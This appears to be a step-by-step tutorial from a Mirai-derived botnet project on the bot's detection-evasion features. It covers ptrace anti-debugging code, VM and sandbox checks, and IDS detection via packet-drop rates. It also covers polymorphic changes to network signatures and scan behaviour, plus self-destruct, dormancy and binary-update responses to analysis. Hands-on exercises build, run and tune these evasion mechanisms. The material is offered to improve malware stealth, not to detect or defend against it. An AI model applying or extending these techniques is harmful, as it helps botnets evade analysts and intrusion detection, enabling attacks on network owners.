# Interactive Tutorial 2: Detection Evasion in Action

## Overview

Learn how the bot detects analysis environments and automatically responds.

**Time**: ~20 minutes  
**Prerequisites**: Tutorial 1 completed  
**Goal**: Understand and test detection evasion mechanisms

---

## What You'll Learn

1. How debugger detection works
2. How sandbox detection works
3. How the bot responds to detection
4. Testing evasion strategies

---

## Part 1: Understanding Detection Methods (5 min)

### Debugger Detection

The bot uses multiple techniques:

```c
// Method 1: ptrace anti-debugging
if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
    // Debugger detected!
}

// Method 2: Check TracerPid in /proc/self/status
// Method 3: Timing analysis (debuggers slow down execution)
```

### Sandbox Detection

```c
// Check VM artifacts
access("/usr/bin/VBoxControl", F_OK)  // VirtualBox
access("/usr/bin/vmware-toolbox-cmd", F_OK)  // VMware

// Check uptime (fresh boots are suspicious)
uptime < 600 seconds  // Less than 10 minutes

// Check CPU count (sandboxes often have 1 CPU)
ncpus < 2
```

---

## Part 2: Testing Detection (10 min)

### Test 1: Run Under Debugger

```bash
# Build the bot first
cd build
cmake .. -DCMAKE_BUILD_TYPE=Debug
make

# Run under GDB
gdb ./src/bot/mirai_bot

# In GDB:
(gdb) run --config ../config/bot.example.json

# EXPECTED: Bot detects debugger and goes dormant
```

**What happens**:
1. Bot starts
2. Detection engine checks for debugger
3. Debugger detected via ptrace
4. Evasion strategy selected: GO_DORMANT
5. Bot sleeps for 1 hour (or exits)

### Test 2: Simulate IDS Detection

```bash
# Start the bot normally
./mirai_bot --config config/bot.json

# In another terminal, watch metrics
curl http://localhost:9090/metrics | grep detection

# Simulate high packet drop rate (IDS blocking traffic)
# The bot will detect this and respond
```

**Expected metrics**:
```
mirai_bot_detections_total{type="ids_ips"} 1
mirai_bot_evasion_actions_total 1
mirai_bot_signature_changes_total 1
```

### Test 3: Check Response Strategies

```bash
# View detection events in real-time
docker-compose logs -f bot | grep -i detection

# You should see:
# [WARN] IDS detected - recommending behavior change
# [INFO] Changing network signature
# [INFO] Modifying scan rate from 1000 to 650
```

---

## Part 3: Evasion Response Flow (5 min)

### The Decision Tree

```
Detection Event
    ↓
Analyze Type + Confidence
    ↓
┌───────────────────────────────────┐
│ Critical (Debugger + Sandbox)?    │
│ → SELF-DESTRUCT                   │
├───────────────────────────────────┤
│ Multiple Critical Detections?     │
│ → GO DORMANT (1 hour)             │
├───────────────────────────────────┤
│ IDS/IPS Detected?                 │
│ → CHANGE SIGNATURE + TIMING       │
├───────────────────────────────────┤
│ Persistent Detection?             │
│ → REQUEST BINARY UPDATE           │
└───────────────────────────────────┘
```

### Polymorphic Transformations

When signature change is triggered:

```python
# Network signature changes:
- TTL: 64 → random(32-128)
- Window size: 5840 → random(4000-8000)
- Packet size: 512 → random(64-1024)
- Source port: sequential → random
- Inter-packet delay: 0ms → random(5-50ms)

# Behavior changes:
- Scan rate: 1000 pps → 650 pps (-35%)
- Connection pool: 128 → 96
- Target selection: sequential → randomized
```

---

## Part 4: Hands-On Exercise

### Exercise 1: Trigger Detection

Create a script to simulate IDS blocking:

```bash
#!/bin/bash
# trigger_detection.sh

echo "Simulating IDS detection..."

# Send many packets that will be "dropped"
for i in {1..100}; do
    curl -X POST http://localhost:9090/api/simulate/packet_drop \
         -d '{"count": 10}'
    sleep 0.1
done

echo "Check metrics for detection event"
curl http://localhost:9090/metrics | grep mirai_bot_detections_total
```

### Exercise 2: Monitor Response

Watch the bot adapt in real-time:

```bash
# Terminal 1: Watch logs
docker-compose logs -f bot

# Terminal 2: Trigger detection
bash trigger_detection.sh

# Terminal 3: Monitor metrics
watch -n 1 'curl -s http://localhost:9090/metrics | grep -E "detection|evasion|signature"'
```

**What to look for**:
1. Detection event logged
2. Evasion action triggered
3. Signature change metric increments
4. Behavior parameters modified

---

## Part 5: Advanced Testing

### Create Custom Detection Scenarios

Edit `config/bot.json`:

```json
{
  "detection_engine": {
    "enabled": true,
    "check_interval_seconds": 30,
    "thresholds": {
      "ids_drop_rate_percent": 20,  // More sensitive
      "honeypot_delay_ms": 50
    },
    "responses": {
      "auto_respond": true,
      "dormancy_duration_seconds": 600  // 10 minutes instead of 1 hour
    }
  }
}
```

### Test Different Scenarios

**Scenario A: Low-level detection**
```bash
# Simulate minor IDS activity
curl -X POST http://localhost:9090/api/simulate/detection \
  -d '{"type":"ids_ips", "confidence":"low"}'

# EXPECTED: Minor signature change
```

**Scenario B: High-level detection**
```bash
# Simulate critical detection
curl -X POST http://localhost:9090/api/simulate/detection \
  -d '{"type":"debugger", "confidence":"high"}'

# EXPECTED: Dormancy or self-destruct
```

---

## Part 6: Viewing Detection in Grafana

1. Open Grafana: http://localhost:3000
2. Navigate to "Detection & Evasion Dashboard"
3. Trigger some detections (from exercises above)
4. Watch graphs update in real-time

**Key panels to watch**:
- Detection Event Timeline (shows when detection occurred)
- Detection by Type (pie chart showing distribution)
- Evasion Actions Triggered (counter)
- Time Since Last Detection (gauge)

---

## Quiz: Test Your Understanding

**Q1**: What happens when both debugger and sandbox are detected?
<details>
<summary>Answer</summary>
The bot self-destructs (cleans up and exits) because this indicates active analysis.
</details>

**Q2**: How does the bot detect an IDS?
<details>
<summary>Answer</summary>
By monitoring packet drop rate. If >30% of packets are dropped, it suspects IDS blocking.
</details>

**Q3**: What changes when signature modification is triggered?
<details>
<summary>Answer</summary>
TTL, window size, packet size, port selection strategy, and inter-packet timing all change.
</details>

---

## Summary

You've learned:
✅ How detection methods work (debugger, sandbox, IDS)  
✅ How to trigger detection events  
✅ How the bot automatically responds  
✅ How to monitor detection and evasion  
✅ How to customize detection thresholds  

**Next**: [Tutorial 3: Training the RL Agent →](03_training_rl_agent.md)

---

## Additional Resources

- `docs/SELF_IMPROVEMENT.md` - Detailed architecture
- `src/evasion/detection_engine.c` - Source code
- Detection dashboard: http://localhost:3000/d/detection-events
